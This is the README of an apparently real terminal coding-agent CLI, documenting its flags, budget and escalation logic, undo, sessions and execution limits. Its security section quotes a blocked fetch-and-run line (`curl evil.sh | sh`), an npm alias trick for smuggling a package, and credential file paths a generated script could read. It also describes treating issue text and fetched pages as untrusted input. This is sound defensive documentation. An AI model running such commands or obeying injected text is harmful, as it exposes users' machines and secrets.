| `--command-timeout <s>` | Kill a command after this long. Default 120 (`DEFAULT_COMMAND_TIMEOUT_MS`, `lib/command.mjs`). |
| `--max-tokens <n>` | Ceiling on each reply. Default **12000** (`DEFAULT_MAX_TOKENS`, `lib/model.mjs`). |
| `--timeout <s>` | Give up on the model after this long. Default 180. |
| `--issue <n>` | Read a GitHub issue, branch, fix it, run the tests. Stops at a local branch — the flow itself never pushes and never opens a PR. (The agent can push only if you separately set `ACUVO_ALLOW_PUSH=1`, and even then never to a protected branch.) |
| `--parallel` | Run several quoted tasks at once. Names any file written by more than one task and exits 1 on a collision. |
| `--concurrency <n>` | How many at a time, 1–4. Default 2. |
| `--json` | One JSON object on stdout, nothing else. Human output goes to stderr. |
| `--output-format <f>` | `text` (default) · `json` (same as `--json`) · `stream-json`: one JSON object per LINE on stdout as the run happens — `init`, every event, then the `--json` document as a `result` line (`lib/stream-json.mjs`). Parity with `claude -p --output-format` and `codex exec --json`. |
| `--dry-run` | Print what *would* be written. Touches nothing, runs nothing. |
| `--plan` | Propose first, then build. Runs a read-only planning pass, prints the plan and asks for approval before anything is written or run. |
| `--strict` | Exit 1 when the run wrote nothing **and** ran nothing. Off by default — a question can be answered correctly without touching anything — but **on automatically when `CI` is set**, because a build step that reports success for doing nothing is the failure the exit code exists to prevent. |
| `--offline` | With `--doctor`: make no network request at all. Your key is not sent anywhere and every endpoint line reads "not probed". Without it, `--doctor` verifies your credential against the route it is configured for — which is how it can tell you a key is *present but revoked*. |
| `--since <period>` | With `acuvo spend`: how far back to total. `7d`, `24h`, `2w`, or a date like `2026-08-01`. Omit it for everything the log still holds. An unparseable period is refused rather than silently meaning "all time". |
| `--version`, `-v` | Print the version. |
| `--help`, `-h` | Usage. |

Run `acuvo` with no prompt to open an **interactive session** — it keeps context between turns, so "now do the same for the other file" works, and later turns are cheaper than the first.

Two different numbers get quoted about that, and only one of them is ours:

- **The prefix we re-send is byte-identical between rounds** — 100%, asserted by `test/cache-prefix-stability.test.mjs` and `test/turn-cache-and-prefix.test.mjs`. That is the half this tool controls.
- **The hit rate actually reported back varies with upstream routing.** A model of this class is served by dozens of interchangeable upstream endpoints, and a prompt cache lives on one of them, so routing decides whether the prefix you already paid for gets reused. Measured 2026-08-14 on the same 4-round task: **46.7%–48.6% unpinned, 73.7%–95.8% pinned** with `ACUVO_PROVIDER_ORDER`. Run `acuvo --json` and read `.cache.hitRate` and `.providers` for yours.

#### Pinning the upstream — `ACUVO_PROVIDER_ORDER`

| variable | what it does |
|---|---|
| `ACUVO_PROVIDER_ORDER` | Comma-separated upstream provider names, in preference order. **Off by default.** Take the names from `acuvo --json` → `.providers.served`, which reports whoever actually answered your last runs. It expresses a *preference*: `allow_fallbacks` stays true, so if the pinned upstream is down the request still goes through somewhere else. That is deliberate — a cheaper request that does not happen is not cheaper. |
| `ACUVO_PROVIDER_STRICT` | `1` turns the preference into a hard pin (`allow_fallbacks: false`), so an unhonourable pin becomes an HTTP 404 instead of a silent re-route. Right for a benchmark, wrong for everyday work. Meaningless without `ACUVO_PROVIDER_ORDER`. |

⚠️ **A pin can be accepted and then ignored.** A provider list that cannot be honoured is generally not rejected — an unknown name, or one your account's data policy excludes, is treated as an empty preference and routing proceeds at random. Measured: a pin that named an upstream not serving that model returned 404 when sent alone and, inside a real request, silently fell back to 0.0% cached. So the run now **says so**: the summary prints `⚠ ACUVO_PROVIDER_ORDER=… did not take` and names who served it instead, and `--json` carries `providers.pin`, `providers.served`, `providers.pinTook`, `providers.pinFellBack`, `providers.pinMissed` and `providers.roundsUnpinned`.

⚠️ **A round can carry no pin at all, and that round is cold.** Measured on a live run 2026-09-01: 4 rounds, served `{DeepInfra: 3, StreamLake: 1}`, and `pinTook 3 / pinFellBack 0 / pinMissed 0 / roundsUnknown 0` — three of four rounds accounted for and nothing said where the fourth went. It was a chain fallback to a model with no pin table, so its round was routed wherever the gateway chose. `providers.roundsUnpinned` is that round; the five counters now sum to `rounds`, and the summary names it.

⚠️ **`model` in `--json` is the model you ASKED FOR.** The chain may answer from a different candidate — that is the whole point of it — so `modelsAnswered` carries every model that actually replied, in the order they first did. It is omitted entirely when no round named one, never `[]`. A run where the configured model answered every round reports a one-element array equal to `model`, and the summary stays silent.

⚠️ **A list is not one cache.** A prompt cache lives on ONE upstream instance, so only the *first* name in the list reuses the cache you have been accumulating; a fallback to the second is a live provider and a cold prefix. Measured 2026-08-16 by replaying one byte-identical 46,171-byte payload against a three-name list: the first-choice upstream served it **98.3% cached**, the second served the same bytes **0.0% cached** — a **4.6× cost difference for an identical request**, on roughly 5% of rounds (2 of 40). `providers.pinTook` counts only first-choice rounds and `providers.pinFellBack` counts the cold ones; the summary names them. `pinMissed` keeps its old meaning — nobody in the list served it — and stays rare, because a three-name list nearly always contains whoever answered.

Exit code is `1` if the last command it ran still fails. That makes it usable in a script.

### Stop on money, not on a counter

```
acuvo --budget 0.50 "make the failing suite pass"
acuvo --until-done --budget 0.50 "make npm test pass, then commit it"
```

The round counter was always an arbitrary stop: it ends a run that is one round from
finishing, and it lets a run that is going nowhere spend its whole allowance. `--budget`
makes the wall the thing you actually have an opinion about.

Before every round it projects what the next one will cost — from the trend of the rounds
so far, with a safety margin — and stops if that would cross your ceiling. So it stops
*before* the round that would exceed the budget, not after. It also **refuses to start**
when it cannot afford even one round, so a `--budget 0.000001` typo costs nothing instead
of buying one round to discover it was hopeless.

The run prints one line at the end:

```
budget: $0.0048 of $0.0500 spent · 4 rounds · next ~$0.0013 · $0.0452 left
```

⚠️ **Two honest limits.** A round that comes back with no reported cost is *estimated* from
its token count at a single blended rate, and the line says so (`⚠ 1 of 3 rounds reported no
cost, so the total is an estimate`) rather than printing a confident total. And the overshoot
bound is **one round, not zero**: a cost curve growing faster than ~1.4× per round can cross
the line by at most that round's own cost. If you need a hard guarantee, leave headroom.

⚠️ **`--until-done` will not run without `--budget`.** An unbounded loop against a paid API,
unattended, is the one thing this CLI refuses to do. With both flags it stops accepting the
model's own "I am finished" while a criterion you declared with `declare_acceptance` has not
actually passed — up to three times, then it stops and records the criterion as unmet. It
still stops immediately on the budget, and it stops if the loop detector sees the same
circular pattern twice.

⚠️ `--budget` and `--parallel` together are refused rather than silently multiplied: a
ceiling for one conversation applied to three tasks is three times the number you typed.

### Escalation: trying harder costs money, so it is budgeted

`--until-done --budget 2.00` does not just retry. It **climbs**, and each rung is entered
only if the remaining budget covers it:

| rung | what it does |
|---|---|
| `solo` | one attempt. What every run does. Cheapest. |
| `fresh` | the same task in a **new context**, carrying the failure and *not* the transcript. The context that produced a loop is the one least able to escape it. |
| `best-of` | several independent attempts in isolated copies of the workspace; whichever **verifies** is the one applied. |

```
$ acuvo --until-done --budget 2.00 "make the suite pass"
  ↑ solo did not verify — escalating to fresh (~0.0019 projected, 0.0081 left)
  ...
  the ladder (each rung ran on its own slice of --budget):
  ✖ solo     $0.0016  would-exceed
  ✔ fresh    $0.0019  verified
  → verified at the fresh rung for $0.0035.
```

Why this exists: on this stack three attempts still cost less than one attempt at frontier
prices, so "try again differently" is a policy you can afford to leave on. "One attempt, be
smart" is a constraint of the price, not of the problem.

Four things it will not do:

- **Start a rung it cannot finish.** Half a best-of spends real money and applies nothing,
  because the winner is chosen by comparison.
- **Guess what a rung costs.** `best-of n` is projected at n times what the last attempt
  actually cost, because it is literally n of them.
- **Hide a rung it skipped.** "It failed" and "it failed and I could not afford to try
  harder" are different facts, and only one of them means *raise the budget*. The report
  says which.
- **Buy the same failure three times.** A missing API key, an exhausted balance or a model
  id that does not exist will fail identically on every rung, so it stops and says so
  instead of paying to prove it twice more.

Each rung runs on its **own slice** of `--budget` (weighted 1 : 1.4 : 3), so the first
attempt cannot spend the whole ceiling and leave nothing to escalate with. The budget is a
ceiling, not a target — when the first rung verifies, the rest is never spent.

#### Escalating the model too

By default every rung uses the model you are already on. Set `ACUVO_MODEL_TIERS` —
cheapest first — and each rung steps up:

```bash
# cheapest first — three model ids, one per rung
ACUVO_MODEL_TIERS="<fast-model>,<mid-model>,<strong-model>"
```

⚠️ **It is off unless you configure it, and that default is arithmetic rather than
caution.** The budget projects each rung from what the *previous* one measurably cost,
which is sound while the model is constant and wrong the moment it is not — a rung on a
model costing 20× per token would be projected at 3× a cheap attempt and waved through.
There is no price table in this package and a wrong one is worse than none, so
configuring tiers is you saying you know what they cost. When a rung does switch model,
the run says so out loud and the cost projection falls back to its floor rather than
trusting a number derived from a different model.

### A REPL that remembers — and nothing else in this category has one

`evaluate` writes a snippet to a file and runs it in a fresh process. So does every
other terminal coding agent: Claude Code, Cursor, Codex and Aider all execute
statelessly, and none of them can hold a value between two thoughts.

That is not how anybody debugs. A human loads the module, looks at a real value,
pokes the object, tries the fix on the live thing:

```
repl   const m = await import("./lib/budget.mjs")
repl   m.parseBudgetUsd("25c")        → { ok: true, usd: 0.25 }
repl   m.formatUsd(0.0025)            → $0.0025
```

Three lines, one process, and line 2 can see line 1. Statelessly that is three
scripts that each re-read and re-parse the file — which is why models rewrite a
whole script to answer a question a single expression would settle, and why each
rewrite is another paid round.

- **Top-level `await` works**, so `await import("./thing.mjs")` reaches your project.
- **It runs in the workspace**, with the real global — `process`, `fetch` and timers
  behave exactly as they do in the code under test.
- **It tells you what it is holding.** Every reply lists the names in scope, so the
  model never has to guess its own state.
- **`repl_reset`** throws the session away. ⚠️ Imports are cached, so reset after
  editing a file you already imported — that is the one real trap.

⚠️ A hanging expression **stops the session** rather than blocking every later call:
the driver is single-threaded, and a REPL that answers nothing is worse than none.
Withheld by `--no-run` and in single-shot runs, like everything else that executes.

### Long-running processes: it can start a server

`run_command` waits for a command to finish and kills it at a timeout, which is right for
`npm test` and makes a dev server impossible rather than slow. Three verbs cover the rest:

| tool | what it does |
|---|---|
| `start_process` | Start something that keeps running — a dev server, a watcher, a build in watch mode. Same allowlist as `run_command`. |
| `check_process` | Read what it has printed, whether it is still running, and — if it announced a port — whether it is **actually answering HTTP on localhost**. |
| `write_process` | Send it a line — a REPL expression, the answer to a `y/N` prompt, the key a dev server asks for. A pipe, not a terminal: programs that insist on a TTY will not see it. The reply lands in the log `check_process` reads. |
| `stop_process` | Stop it and everything it started. |

So the model can write a server, run it, and confirm it serves before telling you it works:

```
round 3  start_process    $ node server.mjs
round 4  check_process    → HTTP 200 on http://localhost:4479/
round 5  stop_process
✔ VERIFIED — `GET http://localhost:4479/` exited 0.
```

⚠️ **The localhost probe is not a hole in the fetch guard.** `fetch_url` still refuses
loopback and private addresses, because a page the model was told to read must not be able
to talk it into fetching an internal address. This connects only to a port **this tool
started**, discovered from that process's own output.

⚠️ **Everything started this way is killed when the run ends** — on normal exit and on
Ctrl-C, with the whole process tree, not just the direct child. Four at a time, and the
refusal names the ones already running.

### What has it cost me?

```
acuvo spend                      # everything the log still holds
acuvo spend --since 7d           # or 24h, 2w, or 2026-08-01
acuvo spend --json               # one object, for a script
```

Every run already appends one redacted line to `.acuvo/audit/<date>.jsonl` including its
cost; this reads them back. No API key, no completion, no network.

> ⚠️ **A run that never recorded a cost is shown separately and is NEVER counted as zero.**
> A run that died on a 401 did not bill anything and genuinely does not know what it cost —
> folding that in as `$0.00` would produce a total that is confidently too low, in the one
> report you open *because* you don't trust your memory of it. A real `$0.00` run (refused
> before any call) is a **known** zero and does count.
>
> The report also says how far back the log reaches, because `audit.mjs` prunes whole days —
> "all time" means "as far back as this still goes", and a total that silently starts
> mid-history is the same kind of lie.

### Several terminals, one checkout

```
acuvo --lease src/api.ts --lease src/db.ts "add the pagination"
acuvo leases        # who holds what, and since when. No API key needed.
```

Leases are per **path**, not per repo — a repo-wide lock would idle six of seven terminals.
They are taken before anything is spent, heartbeated between rounds, and released when the
process exits however it exits. A stale one becomes reclaimable only after its TTL *plus* a
grace period of silence, so a slow model round cannot make a working terminal look dead.

⚠️ **This is a declaration, not a guarantee.** A coding agent does not know which files it
will write until it writes them, so `--lease` protects exactly the paths you name. Making
coverage automatic means calling `acquire()` inside the executor's write path — that work is
not done, and pretending otherwise would be worse than the gap.

⚠️ Two defaults moved and this table was wrong about both for a while: `--max-rounds` was
documented as 3 and `--max-tokens` as 8000. The numbers above are the exported constants,
and `test/docs-truth.test.mjs` now fails the suite if the README and the code disagree
again. `acuvo --help` prints the same values from the same constants — trust either.

### Undo — `acuvo rewind`

Verified end to end on a real run, 2026-08-14:

```
$ acuvo "add a multiply function to math.mjs, write a README, and delete stale.txt"
  ✎ replaced math.mjs   ✎ created README.md   ✂ deleted stale.txt
  · checkpoint 20260814-084541-84u8 — 3 files can be put back: acuvo rewind 20260814-084541-84u8

$ acuvo rewind 20260814-084541-84u8
  ✔ restored math.mjs
  ✔ restored stale.txt
  ✔ deleted README.md — the agent created it
  2 restored · 1 deleted
```

Every mutation goes through two functions (`writeFile` and `deleteFile` in `lib/workspace.mjs`),
so the previous bytes are copied at the moment they still exist — one read of a file that is
about to be overwritten anyway. Blobs are content-addressed: three writes to one file store
**two** blobs when two of them left it the same. Nothing is created until a run mutates
something, and `--dry-run` records nothing at all.

⚠️ **`rewind <id>` means "put the files back the way they were before that run started"**, so it
covers that run *and everything after it*. Undoing an older run while a newer one sits on top
would produce a state no moment in time ever had, which is not a checkpoint.

⚠️ **It refuses any file you changed yourself after the run** — the sha256 of what the agent
left is recorded, and a file that is no longer that is skipped by name with the reason.
`--force` overrides. Nothing restored because everything conflicted exits **3**, not 0.

⚠️ **The agent cannot edit its own undo history.** `.acuvo/` is hard-refused on the executor's
write path (`agentWriteRefusal`, `lib/workspace.mjs`) — reads are untouched, so it can still
explain what it did.

### Runs are saved, and every run leaves a record

Verified by running it, 2026-08-10:

| flag | what it does |
|---|---|
| `--sessions` | List the runs saved in this workspace, newest first, and exit. Needs no API key. |
| `--resume <id>` | Carry on from a saved run. Add an instruction to steer it: `--resume <id> "now add tests"`. |
| `--continue` | The same, on the most recent resumable run. |
| `--no-session` | Do not save this run. |
| `--no-audit` | Do not append this run to the audit log. |
| `--replay <id>` | Step through a saved run: every round, call, result and refusal. Runs **nothing** and writes nothing. |
| `--replay <id> --only <what>` | Narrow it: `refusals`, `writes`, `runs`, `effects`, `reasoning`. A filtered call brings its result with it. |
| `--replay <a> --diff <b>` | Compare two runs and name the step where they split. |

`--replay` is how you answer "what did it actually do on Tuesday" after the terminal has
closed. Real output, from a run made while writing this:

```
run 20260811-034506-nr33 · 2 rounds · verified
⚠ REPLAY — nothing here was re-run. Every line below is what happened then.
── round 1 ─────────────────────────────────────────────
  → call   write_file  path="slug.mjs"  content="export function slugify(s) {…"… (144 chars)
  ✔ result  created slug.mjs (144 bytes)
── round 2 ─────────────────────────────────────────────
  → call   run_command  command="node --test slug.test.mjs"
  ✔ passed  exit code: 0 (0.4s) — PASSED
  counts   3 calls · 0 refused · 2 writes · 1 runs
```

⚠️ It **re-runs nothing** — same invariant `--resume` holds, and for the same reason: a
replay that re-executed would be a command run twice by someone who typed it once. The JSON
form says so in a field (`executed: false`) rather than only in prose.

A finished run writes two things into the workspace: `.acuvo/sessions/<id>.json`, so a
follow-up rebuilds the conversation instead of re-paying for the whole gather, and one
line of `.acuvo/audit/<date>.jsonl` — what was asked, what changed, what verified, what it
cost. Measured: the second turn of a resumed task cost **11,516 tokens against the first
turn's 17,312**.

The audit line carries no file contents, no command output and no model prose, and it is
run through a redactor first (`redact`, `lib/audit.mjs`) — an API key pasted into your task
text comes out as `[redacted:api-key]`. `--dry-run` writes neither file, because a dry run
that creates two files has broken its own promise.

---

## Three things it does that a coding agent usually cannot

### Fix a GitHub issue

```bash
acuvo --issue 42
```

Reads the issue, creates `fix/42-<slug>`, finds the cause, fixes it, runs the tests.

It **stops there**. No push, no pull request — it prints the exact `git push` and `gh pr create`
for you to run. An agent that opens a PR because it believed it was finished is an agent that
embarrasses you in front of your team. If you already use `gh`, it reuses that login.

⚠️ The issue body is treated as untrusted input. Anyone can open an issue on a public repo, so it
is quoted to the model as *a report to investigate*, never as instructions to follow.

### Several tasks at once

```bash
acuvo --parallel "add tests for the parser" "write the README" --concurrency 3
```

The interesting part is not the speed, it is the collision. Two agents in one workspace will
eventually write the same file, and whoever finishes second wins — silently. Acuvo records what
each task wrote, **names any file written by more than one of them**, and exits 1 so
`acuvo --parallel … && git commit` refuses to proceed.

It does not try to merge them. Two model-authored versions of a file cannot be reconciled without
you.

### Work you can script

```bash
acuvo --json "add a health check" | jq '.verification.passed'
```

One object on stdout, every human line on stderr. `ran` and `passed` are separate fields, because
a test suite that executed and failed is not the same as one that never ran.

---

## Not just code

If the services are configured, the tools it can reach include `see_page`, `make_document`,
`transcribe` and `speak`. The combinations are the point:

```bash
acuvo "make me a one-page invoice for Acme Ltd, 3 line items, and give me it as a PDF"
```

→ writes the HTML, **looks at it**, converts it. A real PDF, no coding involved.

```bash
acuvo "transcribe standup.m4a and turn the decisions into a checklist"
```

---

## What it can execute — read this before trusting it

**Four programs, and nothing else:** `node`, `npm`, `npx`, `tsc`.

Concretely: `node <file>`, `node --test <file-or-dir>`, `npm test`, `npm run <script>`, `npx vitest run`, `tsc --noEmit`.

**There is no shell.** Pipes, `&&`, `;`, redirection, quotes, backticks and `$()` are refused by a character whitelist, so `npm test && curl evil.sh | sh` dies at the `&` rather than at a blacklist of program names somebody has to maintain. `rm`, `curl`, `git` and every other binary are simply unreachable.

Arguments are checked too — `node --eval` is refused (code that never touches disk cannot be reviewed afterwards), and every non-flag token must resolve inside your workspace.

`npm test` runs whatever `package.json` says, and the agent can *write* `package.json` — so the **script body is validated before npm is spawned**, along with its `pre`/`post` hooks.

The child process gets a **scrubbed environment**: conventionally-named secrets are stripped, so a generated script cannot read your API keys and post them somewhere.

### Other languages: presets, off by default

Those four are the *default*, not the ceiling, and this README used to stop at "four
programs" as though they were. A project can enable one of six vetted **presets** — each a
build/test driver for code already on disk:

| preset | what it adds |
|---|---|
| `python` | `python`, `python3`, `pytest` |
| `go` | `go` |
| `rust` | `cargo` |
| `ruby` | `ruby`, `rspec`, `bundle` |
| `make` | `make` |
| `node-bin` | `eslint`, `prettier`, `jest` |

```json
// .acuvo/commands.json
{ "presets": ["python"] }
```

Then `python -m pytest` is accepted; without it the refusal *names the preset that would
allow it* rather than just saying no. `acuvo --doctor` prints the enabled set —
`live programs it may run  node, npm, npx, tsc · no presets enabled` on a fresh workspace.

⚠️ **The workspace file may name presets and nothing else, and that boundary is the whole
design.** `.acuvo/commands.json` lives in the workspace, and the agent can write to the
workspace — so a file there choosing an *arbitrary* binary would be the agent granting
itself a program. Every preset is a menu item vetted in `lib/command.mjs`; picking one buys
a second interpreter for code the agent could already execute with `node`. A program of
your own choosing can only be named in **`ACUVO_ALLOW_COMMANDS`**, in the environment that
launches the CLI, which the agent has no verb that reaches. A shell (`bash`, `sh`, `cmd`,
`powershell`, `env`, `xargs`, …) is refused at every layer including that one.

### Adding a dependency — `ACUVO_ALLOW_INSTALL=1`, off by default

"Add zod validation to this endpoint" used to dead-end: the agent wrote the import and had
no verb that could ever make it resolve. `npm install` is now available, and **only** when a
human at the keyboard says so — two spellings of the same switch:

```bash
acuvo --allow-install "add zod validation to the signup endpoint"   # this one run
ACUVO_ALLOW_INSTALL=1 acuvo "…"                                     # this whole shell
```

⚠️ **The flag came late, and the gap it left is the point.** The variable shipped with this
section written about it, and `--help` named it nowhere — so an agent that hit the wall told
the user about an environment variable they had to go and find, in the middle of a refusal.
A capability documented only in the README is one most people never reach.

⚠️ **It is deliberately not a preset.** A preset can be enabled by a file inside the
workspace, and the sentence above — *"picking one buys a second interpreter for code the
agent could already execute"* — has to stay true. An install is not an interpreter, it is a
**downloader**: it runs code that arrived from a stranger seconds ago and that nobody has
read. So it uses the same door as `ACUVO_ALLOW_PUSH`, the only other verb whose blast
radius leaves your machine.

When it is on, the narrowing is the point:

- **`--ignore-scripts` is forced**, derived from the argv at spawn time, so no caller can
  forget it and no flag or `.npmrc` can switch it back on. Install hooks are how essentially
  every npm supply-chain worm has propagated. ⚠️ **The cost is real and named:** packages
  that compile a native addon or download a binary at install time (`esbuild`, `sharp`,
  `better-sqlite3`, `puppeteer`) will land on disk and fail at require time. The tool result
  says so on every install, so the agent can tell you rather than flail.
- **Registry names only** — no URL, git, `file:`, GitHub `user/repo`, or `npm:` alias. The
  alias is the nasty one: `zod@npm:evil-package` leaves `package.json` reading `zod`.
- **A version, not a range.** `zod`, `zod@4.1.12`, `zod@^4.1.0`, `zod@latest`. Not `zod@*`.
- **At most four packages per call**, and `npm ci` may name none (it installs exactly what
  the lockfile already records).
- **The change is saved.** `--no-save` and `--no-package-lock` are refused — an install
  nobody can see in a diff is worse than no install. The result reports the exact line npm
  wrote into `package.json`.
- **A workspace `.npmrc` that redirects `registry=`, sets `ignore-scripts=false`, or names a
  `script-shell` refuses the install.** That file is inside the workspace and the agent can
  write it, so without this check every rule above would be decorative.
- **`npm exec` and `npm publish` have no switch at all**, and an install can never be a
  background process.

⚠️⚠️ **What none of this solves, stated plainly: a package name chosen by a language model
is not safe.** `zod` and `zodd` are both well-formed names, and the Shai-Hulud npm worm
shipped payloads inside AI coding-agent config files precisely because agents install what
they are told to install. No regex separates a typosquat from the real thing. What forced
`--ignore-scripts` buys is that a typosquat which lands has **not executed** — it is code in
`node_modules` that runs only if the agent's own code imports it, which is the same risk
class as `node <file the model wrote>` rather than the strictly worse "arbitrary code ran
during a command that looked like housekeeping".

### A command that asks a question — `ACUVO_INTERACTIVE`, default `halt`

`npm init`, a CLI installer, `Do you want to continue? [Y/n]`, `Enter database password:`.
Measured on Windows before this existed: `npm init` printed `package name: (x) ` and was
**still running at 8,078ms**, i.e. it burned the whole 120s command timeout and returned an
empty string. A plain `readline` question did the opposite — it got EOF at 262ms and exited
with output that reads like a bug in the program. Both are the same defect wearing two
faces: *nobody could answer, and nothing said so.*

| value | what happens |
|---|---|
| `halt` **(default)** | The question is detected and reported, with the exact prompt quoted and a non-interactive flag suggested. **Nothing is ever typed into a child process.** |
| `auto` | A safe `[Y/n]` and a printed default (`name: (my-app) `) are answered. Everything else still stops. |
| `ask` | You are asked, per prompt. Only "yes" is ever sent — a value you type is not passed through. |
| `off` | The old behaviour, exactly: stdin closed, nothing watched. |

⭐ **The safety property is structural, not a blocklist.** There are exactly two strings this
agent can send to a child process — `y` and a bare Enter — and no code path builds a third.
Prompt text therefore cannot become stdin text however it is phrased, so a hostile
postinstall printing *"type DELETE to confirm"* gets no answer at all, it gets a halt. On top
of that, **no mode at all** answers a prompt asking for a credential, a licence/terms
acceptance, or anything whose wording matches a destructive pattern, and a **credential
prompt is redacted before it reaches the transcript or the model's context**.

⚠️ The false-positive defence is two facts about what a prompt *is*: it does not end with a
newline (the cursor has to stay on the line), and the process has produced nothing for
**8 seconds**. Both must hold. A build that goes quiet mid-run is left alone.

**`ACUVO_PTY_MODULE`** — absolute path to a `node-pty`, if you have one. It only makes
`acuvo --doctor` report on it. ⚠️ **It does not change how commands run, and that is a
finding rather than an omission.** A real-terminal transport was built and driven against
node-pty 1.1.0, and withdrawn on the evidence: after a command that settled cleanly at exit
0, the CLI process still held `MessagePort, PipeWrap, PipeWrap, ProcessWrap, Timeout,
Timeout` and **could not exit** — handles inside a worker thread of the library, not
something we can release; its `conpty_console_list_agent` crashed every run with
`AttachConsole failed`; and captured output came back as terminal repaint
(`[?9001h…hi
`), which the model is billed for. Trading a timeout that ends for a
hang that does not is not an upgrade.

The licence was checked properly anyway, from the tarball and not the npm badge: node-pty
1.1.0 is **MIT** (three agreeing notices; bundled `deps/winpty` MIT too). It is separately
unfit as a **dependency**: `install` and `postinstall` lifecycle scripts, its own
dependency, 63 MB unpacked. This package forces `--ignore-scripts` on every install its
agent performs and argues that a package running code at install time is one a human should
install — depending on it would require of you exactly what it refuses to let the agent do.

### ⚠️ There is a second execution path, and this section used to omit it

`evaluate` (`lib/evaluate.mjs`) runs a JavaScript snippet the model wrote. It exists because
the model kept reaching for `node -e "…"`, which dies on the quote whitelist above and burns
a round — so it was given the thing instead of another sentence telling it not to.

**It does not go through the command whitelist at all.** It writes the snippet to
`.acuvo-eval-<pid>-<ts>.mjs` at the workspace root and spawns `node <that file>` directly, so
`ALLOWED_BINARIES`, the argument grammar and the `npm` script-body validation described above
**do not apply to it**. Omitting that from this section was the omission worth naming: the
paragraph claimed four programs and nothing else, and there was a fifth door.

What *does* apply, verified in the source:

- **`--no-run` removes it.** `evaluate` is only offered when running is allowed (`lib/tools.mjs`), so the flag documented as "never execute anything" is honest about it.
- **`--dry-run` refuses it** before anything is staged (`evaluateSnippet`).
- The same **workspace path rules**, the same **bounded spawn**, the same **scrubbed environment** as `run_command`.
- 4,000 characters maximum (`MAX_SNIPPET_CHARS`) — longer than that is a program, and programs get written properly.
- The file is removed in a `finally`, including on timeout, and the snippet is **echoed back in the result**, which is what keeps the `node --eval` audit objection satisfied.

The honest summary: `evaluate` cannot do anything `write_file` + `run_command` could not
already do in two calls, which is the right test for any new capability. But it *is* a code
execution path, and a security section that lists execution paths has to list it.

### And a third: `run_program`

`run_program` (`lib/spawn-argv.mjs`) starts a process too, so by the same rule it belongs in
this list. It exists because the paragraph above is not only a security boundary, it is also
a **capability ceiling**: a string runner cannot tell `node app.js add "buy milk"` from a
model composing a second command, so it refuses the quote — and the agent could not execute
the flags and arguments it had *itself just written*. Measured in three probe runs; two of
them shipped a README describing output that had never been produced.

What applies to it, verified in the source:

- **The same four programs.** `ALLOWED_BINARIES` is imported from `lib/command.mjs`, not
  re-declared. Every `node` flag *before* the script path is checked by asking
  `validateCommand` about that one token, so `--eval`, `--require`, `--import`, `--env-file`,
  `--inspect` and `--watch` stay closed with `command.mjs`'s own refusal sentence. There is
  one authority and no second copy to drift.
- **It is a strict subset, never a widening.** `.acuvo/commands.json` may only *add* presets,
  so the four fixed binaries here can never exceed what `run_command` would allow on the same
  machine. The asymmetry runs the other way: if you enabled the `python` preset, that reaches
  you through `run_command` only.
- **No shell, ever.** `spawn` with `shell: false` and an argv array. A quote, a space, a
  `--flag`, a `;` or a `>` is *data in an argv slot* — there is no parser left to reinterpret
  it, which is why widening the character whitelist was the wrong fix.
- **`--no-run` withholds it and `--dry-run` refuses it**, both at the offer *and* at the
  dispatcher, because a model can call a tool it was never shown.
- The same **bounded spawn**, **output cap** and **scrubbed environment** — plus it deletes
  two variables `run_command` does not: `NODE_OPTIONS` (the flag allowlist's back door, read
  by node before argv) and `NODE_TEST_CONTEXT` (which makes a nested `node --test` return
  exit 0 and empty output — a silent green).
- **No detached spawning, and no process-group kill.** The child is SIGKILLed on timeout and
  a grandchild it spawned can outlive it. Stated rather than papered over.

### ⚠️ What this is not

**It is not a sandbox, and calling it one would be dishonest.** `node src/thing.js`, where a language model wrote `src/thing.js` thirty seconds ago, *is* arbitrary code execution — unavoidably, because running the code is the entire point of a fix loop.

The real boundary: the agent cannot compose a command, cannot pick a program, cannot pass arguments outside your workspace, and cannot see your credentials **in its environment**. The code it runs can still do anything Node can do. The mitigation is that the code is **on disk, written by tools that could not leave the workspace, and shown to you** before it runs.

⚠️ Those three words matter and were missing. The scrub is a **denylist over environment
variable names** (`SECRET_NAME`, `lib/command.mjs`). It does not reach the filesystem: a
generated script can still read `~/.aws/credentials`, `~/.ssh/id_rsa` and
`~/.config/gh/hosts.yml`, and a variable named `MY_DB_STRING` survives the pattern. The
source says so about itself; this sentence used to round it up to "cannot see your
credentials", full stop.

Use `--dry-run` for a task you do not trust yet, or `--no-run` to let it write without
executing. Both now also block the MCP spawn described below — verified by running a
workspace containing a hostile `.mcp.json` under each flag.

---

## The rest of the verbs

The registry holds **88 tools** (`TOOL_SCHEMAS`, `lib/tools.mjs` — count it yourself, and
`acuvo --doctor` prints which of them would be offered on your machine). The obvious ones
are above; **the rest** reach the model in any multi-round run (`--max-rounds` above 1,
which is the default). You never name them — the model picks. They are listed because a
capability only the changelog knows about is unreachable in the way that matters.

| tool | what it does | when it is offered |
|---|---|---|
| `check_tools` | **Ask what this machine and this run can actually execute, before writing a command that gets refused.** For each program it answers both halves — is it installed on `PATH`, and is *this run* allowed to run it — and when the answer is no, the one line a human adds to change that. With no arguments it lists what is already runnable here, which presets are on, and whether `npm install` is enabled. ⚠️ **A shell does not make this redundant.** `which python3` says yes on a machine where the agent is still refused it; that exact sequence appears seven times in our own benchmark transcripts, each one followed by the model downgrading to raw `run_command`. Across 139 recorded runs the model hand-rolled `which` / `command -v` **201 times in 52 of them** — the most-repeated shell idiom in the corpus with no verb behind it. It never executes anything: it reads `PATH` and `.acuvo/commands.json`, and it returns no absolute paths. | multi-round runs; withheld by `--no-run`, because then the answer is "nothing, regardless" |
| `run_program` | Run `node` / `npm` / `npx` / `tsc` with a **real argument array** instead of a string. `run_command` has to guess whether a quote is you passing a value or the model composing a second command, so it refuses the character — which means `node bin/todo.js add "buy milk"`, `node bin/todo.js list --all` and `node --test "test/*.test.mjs"` were all unrunnable. Here each array item is exactly one argv slot, there is no shell and nothing re-parses it. | withheld by `--no-run` and by `--dry-run`, like every other way of starting a process |
| `read_lines` · `read_around` | Windowed reads of a large file. `read_file` truncates the **middle** of a big file and gives the model nothing to act on; these truncate the **end** and hand back a `nextOffset` to continue from. `read_around` returns byte-exact text with real indentation, which is the only safe source for an `edit_file` old\_string. | always |
| `list_engines` | **What a creative engine costs, before you spend one finding out.** Lists the Acuvo image/video/voice/face engines, whether each is on your plan, and the credit cost per image or clip. ⚠️ **This package holds no price list** — it asks your account's gateway and caches the answer under `~/.acuvo/`, because a price compiled into an npm package is the price that shipped the day you installed it, and a price in `node_modules` is one the person being billed can edit. With no answer it prints **prices unavailable** rather than a plausible number. | multi-round runs; needs no key of any kind |
| `fetch_url` | Fetch a public page as text. GET only, no headers, private and loopback addresses refused, 10 fetches per run. | always |
